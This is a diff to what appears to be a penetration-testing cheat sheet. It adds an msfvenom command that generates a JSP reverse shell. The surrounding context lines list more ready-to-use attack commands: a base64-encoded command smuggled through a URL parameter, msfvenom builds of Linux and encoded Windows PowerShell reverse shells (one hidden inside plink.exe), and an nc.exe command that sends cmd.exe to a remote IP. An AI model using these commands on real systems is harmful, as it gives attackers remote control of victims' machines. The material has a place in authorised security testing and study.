@@ -166,6 +166,7 @@
 	- ```http://target?cli=%22bHMgLWxhIC92YXIvdG1wLw==%22```
   - ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf > stickfish.zip```
   - ```msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f psh --arch x64 --platform windows -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o stick.ps1```
+  - ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp```
   - ```nc.exe 10.10.14.3 4444 -e c:\\Windows\\System32\\cmd.exe```
 
 - Passwords
